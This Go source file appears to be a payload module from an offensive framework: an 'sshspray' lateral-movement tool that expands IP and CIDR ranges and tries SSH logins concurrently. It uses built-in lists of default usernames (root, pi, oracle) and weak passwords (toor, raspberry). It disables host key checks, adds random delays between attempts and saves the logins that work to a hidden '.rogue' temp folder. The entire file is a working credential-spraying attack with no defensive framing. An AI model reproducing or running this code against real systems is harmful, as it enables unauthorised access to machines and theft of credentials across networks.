package payloads

import (
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

func init() {
	Register(&SSHSpray{})
}

type SSHSpray struct{}

func (s *SSHSpray) Name() string        { return "sshspray" }
func (s *SSHSpray) Category() string    { return "lateral" }
func (s *SSHSpray) Description() string { return "SSH credential spraying with goroutine worker pool" }

func (s *SSHSpray) Execute(args map[string]string) ([]byte, error) {
	targetsStr := args["targets"]
	usersStr := args["usernames"]
	passStr := args["passwords"]
	targetFile := args["target_file"]
	threadsInt := 5
	timeoutInt := 5
	fmt.Sscanf(args["threads"], "%d", &threadsInt)
	fmt.Sscanf(args["timeout"], "%d", &timeoutInt)

	result := s.spray(targetsStr, usersStr, passStr, targetFile, threadsInt, timeoutInt)
	return MarshalJSON(result)
}

type sshSprayResult struct {
	Timestamp     string              `json:"timestamp"`
	Successes     int                 `json:"successful"`
	Failed        int                 `json:"failed"`
	Errors        int                 `json:"errors"`
	Credentials   []sshCred           `json:"credentials"`
	SampleErrors  []map[string]string `json:"sample_errors,omitempty"`
	TotalAttempts int                 `json:"total_attempts"`
}

type sshCred struct {
	Target   string `json:"target"`
	Username string `json:"username"`
	Password string `json:"password"`
	Time     string `json:"timestamp"`
}

func (s *SSHSpray) spray(targetsStr, usersStr, passStr, targetFile string, threads, timeoutSec int) *sshSprayResult {
	r := &sshSprayResult{
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}

	// Parse targets
	var targets []string
	if targetFile != "" {
		data, err := os.ReadFile(targetFile)
		if err == nil {
			for _, line := range strings.Split(string(data), "\n") {
				line = strings.TrimSpace(line)
				if line != "" {
					targets = append(targets, expandTarget(line)...)
				}
			}
		}
	}
	if targetsStr != "" {
		for _, t := range strings.Split(targetsStr, ",") {
			t = strings.TrimSpace(t)
			if t != "" {
				targets = append(targets, expandTarget(t)...)
			}
		}
	}

	// Parse/users passwords
	usernames := []string{"root", "admin", "ubuntu", "pi", "test", "user", "oracle", "postgres"}
	passwords := []string{"password", "123456", "admin", "root", "test", "password123", "toor", "raspberry", "changeme"}

	if usersStr != "" {
		usernames = strings.Split(usersStr, ",")
	}
	if passStr != "" {
		passwords = strings.Split(passStr, ",")
	}

	if len(targets) == 0 {
		return r
	}

	// Build job queue
	type job struct {
		target   string
		username string
		password string
	}

	jobs := make(chan job, 1000)
	go func() {
		for _, target := range targets {
			for _, user := range usernames {
				for _, pass := range passwords {
					jobs <- job{target: target, username: strings.TrimSpace(user), password: strings.TrimSpace(pass)}
				}
			}
		}
		close(jobs)
	}()

	var wg sync.WaitGroup
	var mu sync.Mutex
	sema := make(chan struct{}, threads)

	for j := range jobs {
		if len(r.Credentials) > 50 {
			// Stop when we have enough successes
			break
		}
		sema <- struct{}{}
		wg.Add(1)
		go func(j job) {
			defer wg.Done()
			defer func() { <-sema }()

			success := trySSH(j.target, j.username, j.password, timeoutSec)
			mu.Lock()
			if success {
				r.Credentials = append(r.Credentials, sshCred{
					Target:   j.target,
					Username: j.username,
					Password: j.password,
					Time:     time.Now().UTC().Format(time.RFC3339),
				})
				r.Successes++
			} else {
				r.Failed++
			}
			mu.Unlock()

			// Delay
			time.Sleep(time.Duration(100+time.Now().Nanosecond()%1000) * time.Millisecond)
		}(j)
	}
	wg.Wait()

	r.TotalAttempts = r.Successes + r.Failed

	// Save credentials
	cacheDir := filepath.Join(os.TempDir(), ".rogue", "ssh")
	os.MkdirAll(cacheDir, 0700)
	credFile := filepath.Join(cacheDir, fmt.Sprintf("ssh_creds_%s.txt", time.Now().Format("20060102_150405")))
	var credLines []string
	for _, c := range r.Credentials {
		credLines = append(credLines, fmt.Sprintf("%s:%s:%s", c.Target, c.Username, c.Password))
	}
	os.WriteFile(credFile, []byte(strings.Join(credLines, "\n")), 0600)

	return r
}

func expandTarget(target string) []string {
	var targets []string

	// CIDR range
	if strings.Contains(target, "/") {
		_, ipnet, err := net.ParseCIDR(target)
		if err == nil {
			firstIP := ipnet.IP.Mask(ipnet.Mask)
			for ip := make(net.IP, len(firstIP)); copy(ip, firstIP) > 0; incIP(ip) {
				if !ipnet.Contains(ip) {
					break
				}
				if !ip.Equal(firstIP) {
					targets = append(targets, ip.String())
				}
				if len(targets) >= 256 {
					break
				}
			}
			return targets
		}
	}

	// Range like 192.168.1.1-100
	if strings.Contains(target, "-") && strings.Count(target, ".") == 3 {
		lastDot := strings.LastIndex(target, ".")
		base := target[:lastDot]
		rangeStr := target[lastDot+1:]
		if strings.Contains(rangeStr, "-") {
			parts := strings.SplitN(rangeStr, "-", 2)
			var start, end int
			n1, _ := fmt.Sscanf(parts[0], "%d", &start)
			n2, _ := fmt.Sscanf(parts[1], "%d", &end)
			if n1 == 1 && n2 == 1 {
				for i := start; i <= end && i <= 255; i++ {
					targets = append(targets, fmt.Sprintf("%s.%d", base, i))
				}
			}
			return targets
		}
	}

	targets = append(targets, target)
	return targets
}

func incIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

func trySSH(host, username, password string, timeout int) bool {
	config := &ssh.ClientConfig{
		User:            username,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         time.Duration(timeout) * time.Second,
	}

	addr := fmt.Sprintf("%s:22", host)
	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		return false
	}
	client.Close()
	return true
}
